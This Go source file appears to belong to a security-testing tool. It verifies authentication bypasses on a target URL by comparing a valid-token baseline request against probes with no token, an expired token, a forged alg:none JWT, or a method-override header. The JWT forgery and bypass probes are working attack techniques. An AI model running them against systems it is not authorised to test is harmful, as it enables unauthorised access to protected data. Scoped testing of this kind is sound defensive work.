package verify

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math"
	"os"
	"strings"

	"github.com/srank/ensphere/internal/evidence"
)

// AuthConfig holds configuration for auth bypass verification.
type AuthConfig struct {
	URL       string
	Method    string // HTTP method
	Token     string // Valid token for baseline
	Technique string // no_token | expired_token | alg_none | method_override
	ProbeConfig
}

var validAuthTechniques = map[string]bool{
	"no_token": true, "expired_token": true,
	"alg_none": true, "method_override": true,
}

// VerifyAuth runs the auth bypass verification probe.
func VerifyAuth(cfg AuthConfig) (*VerifyResult, error) {
	if err := CheckScope(cfg.URL, cfg.InScope); err != nil {
		return nil, err
	}

	if !validAuthTechniques[cfg.Technique] {
		return nil, fmt.Errorf("unsupported technique %q — use: no_token, expired_token, alg_none, method_override", cfg.Technique)
	}

	timer := NewTimer()
	throttle := NewThrottle(cfg.ThrottleMs)

	var ew *evidence.Writer
	if cfg.Evidence != "" {
		var err error
		ew, err = evidence.NewWriter(cfg.Evidence)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Warning: could not open evidence file: %v\n", err)
		} else {
			defer ew.Close()
		}
	}

	probeCount := 0

	// Baseline: send with valid token
	baselineHeaders := make(map[string]string)
	for k, v := range cfg.Headers {
		baselineHeaders[k] = v
	}
	baselineHeaders["Authorization"] = "Bearer " + cfg.Token

	throttle.Wait()
	probeCount++
	baselineResp := HTTPProbe(cfg.Method, cfg.URL, "", baselineHeaders, cfg.TimeoutSec)
	if baselineResp.Error != nil {
		return nil, fmt.Errorf("baseline probe: %w", baselineResp.Error)
	}
	fmt.Fprintf(os.Stderr, "[BASELINE] status=%d len=%d\n", baselineResp.StatusCode, len(baselineResp.Body))
	writeEvidence(ew, "auth_bypass", cfg.Technique, cfg.URL, "", baselineResp.StatusCode,
		fmt.Sprintf("%dms", baselineResp.ElapsedMs), "baseline", "valid token")

	if baselineResp.StatusCode != 200 {
		return &VerifyResult{
			Status:     "error",
			VulnType:   "auth_bypass",
			Technique:  cfg.Technique,
			Confidence: "low",
			Evidence:   fmt.Sprintf("Baseline with valid token returned %d — expected 200", baselineResp.StatusCode),
			ProbeCount: probeCount,
			Duration:   timer.Elapsed(),
		}, nil
	}

	// Build probe headers based on technique
	probeHeaders := make(map[string]string)
	for k, v := range cfg.Headers {
		probeHeaders[k] = v
	}

	probeMethod := cfg.Method

	switch cfg.Technique {
	case "no_token":
		// Send without Authorization header
	case "expired_token":
		probeHeaders["Authorization"] = "Bearer expired.invalid.token"
	case "alg_none":
		algNoneToken, err := buildAlgNoneJWT(cfg.Token)
		if err != nil {
			return nil, fmt.Errorf("build alg:none JWT: %w", err)
		}
		probeHeaders["Authorization"] = "Bearer " + algNoneToken
	case "method_override":
		probeHeaders["Authorization"] = "Bearer " + cfg.Token
		if strings.ToUpper(cfg.Method) == "POST" {
			probeMethod = "GET"
			probeHeaders["X-HTTP-Method-Override"] = "POST"
		} else {
			probeMethod = "POST"
			probeHeaders["X-HTTP-Method-Override"] = "GET"
		}
	}

	throttle.Wait()
	probeCount++
	probeResp := HTTPProbe(probeMethod, cfg.URL, "", probeHeaders, cfg.TimeoutSec)
	if probeResp.Error != nil {
		return nil, fmt.Errorf("auth probe: %w", probeResp.Error)
	}
	fmt.Fprintf(os.Stderr, "[PROBE] status=%d len=%d technique=%s\n", probeResp.StatusCode, len(probeResp.Body), cfg.Technique)
	writeEvidence(ew, "auth_bypass", cfg.Technique, cfg.URL, "", probeResp.StatusCode,
		fmt.Sprintf("%dms", probeResp.ElapsedMs), "probe", fmt.Sprintf("technique=%s", cfg.Technique))

	// Evaluate: 200 with similar body length = bypassed
	bypassed := probeResp.StatusCode == 200 &&
		math.Abs(float64(len(probeResp.Body)-len(baselineResp.Body))) < float64(len(baselineResp.Body))*0.3

	var status, confidence, evidenceStr string
	if bypassed {
		status = "confirmed"
		confidence = "high"
		evidenceStr = fmt.Sprintf("Auth bypass via %s — status 200 with similar body length (%d vs %d baseline)",
			cfg.Technique, len(probeResp.Body), len(baselineResp.Body))
	} else if probeResp.StatusCode == 200 {
		status = "potential"
		confidence = "medium"
		evidenceStr = fmt.Sprintf("Status 200 but body length differs significantly (%d vs %d baseline)",
			len(probeResp.Body), len(baselineResp.Body))
	} else {
		status = "safe"
		confidence = "high"
		evidenceStr = fmt.Sprintf("Auth correctly enforced — %s returned status %d", cfg.Technique, probeResp.StatusCode)
	}

	return &VerifyResult{
		Status:     status,
		VulnType:   "auth_bypass",
		Technique:  cfg.Technique,
		Confidence: confidence,
		Evidence:   evidenceStr,
		Details: AuthDetails{
			Technique:      cfg.Technique,
			Bypassed:       bypassed,
			ResponseStatus: probeResp.StatusCode,
			ResponseLength: len(probeResp.Body),
		},
		ProbeCount: probeCount,
		Duration:   timer.Elapsed(),
	}, nil
}

// buildAlgNoneJWT takes a valid JWT and returns a modified version with alg:none.
func buildAlgNoneJWT(token string) (string, error) {
	parts := strings.SplitN(token, ".", 3)
	if len(parts) != 3 {
		return "", fmt.Errorf("invalid JWT: expected 3 parts, got %d", len(parts))
	}

	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return "", fmt.Errorf("decode JWT header: %w", err)
	}

	var header map[string]interface{}
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return "", fmt.Errorf("parse JWT header: %w", err)
	}

	header["alg"] = "none"

	newHeaderBytes, err := json.Marshal(header)
	if err != nil {
		return "", fmt.Errorf("marshal JWT header: %w", err)
	}

	newHeader := base64.RawURLEncoding.EncodeToString(newHeaderBytes)
	return newHeader + "." + parts[1] + ".", nil
}
